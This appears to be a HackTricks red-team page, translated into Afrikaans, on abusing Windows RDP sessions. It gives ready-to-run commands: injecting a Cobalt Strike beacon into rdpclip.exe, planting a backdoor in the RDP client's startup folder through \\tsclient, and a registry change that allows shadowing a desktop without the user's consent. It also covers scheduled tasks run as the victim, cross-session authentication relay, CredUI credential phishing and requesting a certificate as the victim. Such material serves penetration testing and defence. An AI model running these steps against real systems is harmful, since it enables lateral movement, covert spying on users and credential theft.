# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

As die **external group** **RDP-toegang** tot ’n **rekenaar** in die huidige domein het, kan ’n aanvaller wat daardie rekenaar kompromitteer, wag totdat ’n lid van die groep koppel.

Sodra die gebruiker via RDP koppel, kan die **aanvaller na daardie gebruiker se sessie pivot** en die gebruiker se toestemmings in die eksterne domein misbruik.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Kyk na [**ander maniere om sessies met ander nutsmiddels te steel**](../../network-services-pentesting/pentesting-rdp.md#session-stealing).

## Kruissessie-verifikasie-aflos

’n **Aktiewe konsole- of RDP-sessie** wat aan ’n ander domeingebruiker behoort, is ook ’n aanknopingspunt wanneer jy ’n shell met laer voorregte op dieselfde gasheer het. DCOM-kruissessie-aktivering kan veroorsaak dat ’n geskikte COM-bediener in daardie interaktiewe sessie verifieer, en nutsmiddels soos RemotePotato0 of KrbRelay kan daardie verifikasie vaslê of aflos. Die aangemelde gebruiker hoef nie ’n domeinadministrateur te wees nie: ’n noukeurig beperkte gidsreg, soos toestemming om ’n gMSA-bestuurde wagwoord te lees, kan genoeg wees vir ’n verdere pivot.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

Begin met die sessie-ID en identiteit uit `query user`, `qwinsta` of die bestaande winPEAS-sessie-inventaris. Beskou hulle as **kandidate**, nie as bewys van ’n moontlike aflosroete nie. Die COM-klas, sy nabootsings- en verifikasievlakke, sessietoeganklikheid, firewall-/OXID-roetering, die teikenprotokol se beskermingsmeganismes en die aangemelde hoofgebruiker se effektiewe regte speel almal ’n rol. KrbRelay dokumenteer voorbeelde van kruissessie-aflos na LDAP, HTTP, SMB en NTLM, maar hierdie roetes hang af van die weergawe en konfigurasie. LDAP-kanaalbinding is ook ’n aflosversperring aan die teikenkant. Die RemotePotato0-projek meld spesifiek dat sy oorspronklike RPC-na-LDAP-uitbuitingscenario in 2022 reggestel is; moenie uit ’n sigbare sessie alleen aflei dat LDAP-aflos sal slaag nie.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

As ’n gebruiker via **RDP toegang verkry tot ’n masjien** waar ’n **aanvaller** vir hom **wag**, sal die aanvaller **’n beacon in die gebruiker se RDP-sessie kan inspuit**. As die **slagoffer sy skyf gemonteer het** toe hy via RDP toegang verkry het, **kan die aanvaller toegang daartoe kry**.

In hierdie geval kan jy eenvoudig die **slagoffer se oorspronklike rekenaar in gevaar stel** deur ’n **backdoor** in die **opstartlêergids** te skryf.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

As jy **local admin** is op ’n gasheer waar die slagoffer reeds ’n **active RDP session** het, kan jy moontlik **daardie werkskerm bekyk/beheer sonder om die wagwoord te steel of LSASS te dump**.<sup>[[1]](#references)</sup>

Dit hang af van die **Remote Desktop Services shadowing**-beleid wat gestoor word in:<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Interessante waardes:

- `0`: Gedeaktiveer
- `1`: `EnableInputNotify` (beheer, gebruikergoedkeuring word vereis)
- `2`: `EnableInputNoNotify` (beheer, **geen gebruikergoedkeuring nie**)
- `3`: `EnableNoInputNotify` (slegs kyk, gebruikergoedkeuring word vereis)
- `4`: `EnableNoInputNoNotify` (slegs kyk, **geen gebruikergoedkeuring nie**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

Dit is veral nuttig wanneer ’n bevoorregte gebruiker wat via RDP gekoppel was, ’n ontsluite lessenaar, KeePass-sessie, MMC-konsole, blaaiersessie of admin shell oop gelos het.

## Geskeduleerde take as aangemelde gebruiker

As jy **local admin** is en die teikengebruiker **tans aangemeld is**, kan Task Scheduler code **as daardie gebruiker begin sonder hul wagwoord**.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

Dit verander die slagoffer se bestaande aanmeldingsessie in ’n uitvoeringsprimitief:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

Notas:

- As die gebruiker **nie aangemeld is nie**, vereis Windows gewoonlik die wagwoord om ’n taak te skep wat as hulle loop.
- As die gebruiker **aangemeld is**, kan die taak die bestaande aanmeldkonteks hergebruik.
- Dit is ’n praktiese manier om GUI-aksies uit te voer of binaries binne die slagoffersessie te begin sonder om aan LSASS te raak.

## CredUI-promptmisbruik vanuit die slagoffersessie

Sodra jy **binne die slagoffer se interaktiewe werkskerm** kan uitvoer (byvoorbeeld via **Shadow RDP** of **’n geskeduleerde taak wat as daardie gebruiker loop**), kan jy ’n **egte Windows-aanmeldingsporing** met CredUI-API’s vertoon en die slagoffer se ingevoerde aanmeldbesonderhede insamel.<sup>[[1]](#references)</sup>

Relevante API’s:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Tipiese verloop:

1. Begin ’n binary in die slagoffersessie.
2. Vertoon ’n domeinstawingsporing wat by die huidige domein se handelsmerk pas.
3. Pak die teruggestuurde auth-buffer uit.
4. Valideer die verskafte aanmeldbesonderhede en vertoon opsioneel die poring herhaaldelik totdat geldige aanmeldbesonderhede ingevoer word.

Dit is nuttig vir **phishing op die gasheer**, omdat die poring deur standaard Windows-API’s vertoon word eerder as deur ’n vals HTML-vorm.

## Versoek ’n PFX in die slagoffer se konteks

Dieselfde primitief van **’n geskeduleerde taak as gebruiker** kan gebruik word om ’n **sertifikaat/PFX as die aangemelde slagoffer** aan te vra. Daardie sertifikaat kan later vir **AD-stawing** as daardie gebruiker gebruik word, wat wagwoorddiefstal heeltemal vermy.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

Hoëvlakverloop:

1. Kry **plaaslike admin**-toegang op ’n gasheer waarop die slagoffer aangemeld is.
2. Voer inskrywings-/uitvoerlogika as die slagoffer uit deur ’n **geskeduleerde taak** te gebruik.
3. Voer die resulterende **PFX** uit.
4. Gebruik die PFX vir PKINIT / sertifikaatgebaseerde AD-stawing.

Sien die AD CS-bladsye vir verdere misbruik:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - Van plat netwerke tot afgeslote domeine met tiering-modelle](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – `mstsc`-opsies vir skadu-sessies](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - Shadow RDP-inprop-PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as-module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Versoek PFX via geskeduleerde taak-PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - DCOM-aktivering oor sessies heen en huidige beperkings](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - voorbeelde van relaying oor sessies heen en CLSID-vereistes](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - query session-opdrag](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - ms-DS-GroupMSAMembership-kenmerk](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - LDAP-kanaalbinding en beskerming teen relaying](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
